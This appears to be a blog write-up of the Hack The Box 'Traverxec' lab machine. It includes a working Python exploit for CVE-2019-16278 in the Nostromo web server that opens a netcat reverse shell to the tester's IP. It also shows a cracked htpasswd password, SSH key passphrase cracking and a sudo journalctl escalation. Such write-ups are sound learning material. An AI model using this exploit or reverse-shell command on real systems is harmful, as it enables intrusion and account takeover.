---
layout: post
title:  "CVE-2019-16278 Hackthebox Traverxec Writeup"
date:   2020-04-12 #10:55:00
categories: ctf
description: this article explains about ctf writeup.
tags: ctf-writeup hackthebox
---

# Traverxec

<img src="/images/htb/Traverxec/2019-12-09-221720_593x350_scrot.png">

hello this is my writeup for Traverxec from hackthebox, an awesome platform to
learn hacking

# Scanning

for the first time, we have to gathering more information about this machine
so i use nmap to see what ports is open and what services they are.

<img src="/images/htb/Traverxec/2019-12-09-222804_511x170_scrot.png">

this machine running http (80) and ssh (22) ,so that i open the web page on my browser
and this is the web page

<img src="/images/htb/Traverxec/2019-12-09-223134_1288x562_scrot.png" style="width: 500px;">

it looks like a normal static website, so i try to accessing /admin and this is what i got

<img src="/images/htb/Traverxec/2019-12-09-223400_347x123_scrot.png">

as you can see , this website is using nostromo web server , so i check about this webserver
and searching for the bug and i got this CVE [here](https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html) so i create a python script to exploit the web server , this is my exploit :

{% highlight python %}
from pwn import *

#CVE-2019-16278
cmd = "nc -e /bin/bash 10.10.15.185 1337"
payload="""POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1""".format(cmd)

r = remote("10.10.10.165",80)
r.sendline(payload)
r.interactive()
{% endhighlight %}

before running the script i listening to port 1337 from my machine

<img src="/images/htb/Traverxec/2019-12-09-224215_356x33_scrot.png">

and run the exploit

<img src="/images/htb/Traverxec/2019-12-09-225200_443x154_scrot.png">

after running the exploit , check the listening terminal again , and we got
our shell

<img src="/images/htb/Traverxec/2019-12-09-225321_641x156_scrot.png">

now lets see nostromo web server directory on /var/nostromo , and i found
several directory

	conf
	htdocs
	icons
	logs

the most interesting thing is conf folder , so i check conf directory and found two
file

	mimes
	nhttpd.conf

nhttpd? hmm okay it looks interesting , so let's open it

	# MAIN [MANDATORY]

	servername		traverxec.htb
	serverlisten		*
	serveradmin		david@traverxec.htb
	serverroot		/var/nostromo
	servermimes		conf/mimes
	docroot			/var/nostromo/htdocs
	docindex		index.html

	# LOGS [OPTIONAL]

	logpid			logs/nhttpd.pid

	# SETUID [RECOMMENDED]

	user			www-data

	# BASIC AUTHENTICATION [OPTIONAL]

	htaccess		.htaccess
	htpasswd		/var/nostromo/conf/.htpasswd

	# ALIASES [OPTIONAL]

	/icons			/var/nostromo/icons

	# HOMEDIRS [OPTIONAL]

	homedirs		/home
	homedirs_public		public_www

# Cracking htpasswd

there is htpasswd inside /var/nostromo/conf/ and some
HOMEDIRS configuration , let's see what inside htpasswd

	david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/

the password is encrypted , so i check the hash using hashid

<img src="/images/htb/Traverxec/2019-12-09-230146_567x75_scrot.png">

well okay , let's use hashcat to crack it , after reading the example hash from
hashcat documentation [here](https://hashcat.net/wiki/doku.php?id=example_hashes)
i got information about the hash-mode , it's 500 so let's crack it using rockyou wordlist
you can download the wordlist [here](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwj7gJXN-KjmAhXFR30KHQRKBXcQFjAAegQIARAB&url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd)

<img src="/images/htb/Traverxec/2019-12-09-230819_641x46_scrot.png">

okay good , we got the password. but this is not the ssh password , after enumerating and reading the manual [here](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd#HOMEDIRS) i got something inside homedirs

	To serve the home directories of your users via HTTP, enable the homedirs option by
	defining the path in where the home directories are stored, normally /home. To access
	a users home directory enter a ~ in the URL followed by the home directory name like
	in this example:

	http://www.nazgul.ch/~hacki/

well , let's try to open on the machine.
http://10.10.10.165/~david/

<img src="/images/htb/Traverxec/2019-12-09-231221_1301x560_scrot.png" style="width: 500px;">

another web page ? okay. after enumerating more, i end up trying to accessing /home/david
via CVE-2019-16278 and i got nothing but , i remember about our homedirs, there is
a configuration like this :

	homedirs		/home
	homedirs_public		public_www

so i asume public_www must be exist inside /home/david/ so when i try to access via /home/david/public_www i got something:

<img src="/images/htb/Traverxec/2019-12-09-231902_166x88_scrot.png">

a directory called protected-file-area, and it's contain a file

	backup-ssh-identity-files.tgz

okay let's download the file via browser by accessing the link

	http://10.10.10.165/~david/protected-file-area/

and i got a prompt like this

<img src="/images/htb/Traverxec/2019-12-09-232159_573x158_scrot.png">

so let's use `david` as our username and `Nowonly4me` as our password
and we are in

<img src="/images/htb/Traverxec/2019-12-09-232309_854x194_scrot.png">

# Crack Rsa Private Key

after download the file, i got `.ssh` directory and some files

	authorized_keys
	id_rsa
	id_rsa.pub

from now we got a private key right ? so let's crack the private key
to get the passphrase, i use ssh2john and pipe it to a file, you can download ssh2john [here](https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/run/ssh2john.py)
and now let's crack it

<img src="/images/htb/Traverxec/2019-12-09-233106_817x194_scrot.png">

nice, we got the passphrase, now lets try to login via ssh as david

<img src="/images/htb/Traverxec/2019-12-09-233259_878x133_scrot.png">

# Rooting Machine

after login i found something inside /home/david/bin

	server-stats.head
	server-stats.sh

and this is server-stats.sh

	#!/bin/bash2

	cat /home/david/bin/server-stats.head
	echo "Load: `/usr/bin/uptime`"
	echo " "
	echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
	echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
	echo " "
	echo "Last 5 journal log lines:"
	/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat

and this is what i got, if i run the script

<img src="/images/htb/Traverxec/2019-12-09-233729_640x250_scrot.png">

it looks like journalctl running as root, so it possible to us to escalate via
journalctl.

# Privilege Escalation
after reading on [here](https://gtfobins.github.io/gtfobins/journalctl/)
i found that journalctl is using less as default pager, so if the size of our terminal
is too small to load the output it will pipe to less. firstly i copied last line of server-stats.sh and remove pipe , like this

	/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service

and run it.

<img src="/images/htb/Traverxec/2019-12-10-150815_564x388_scrot.png">
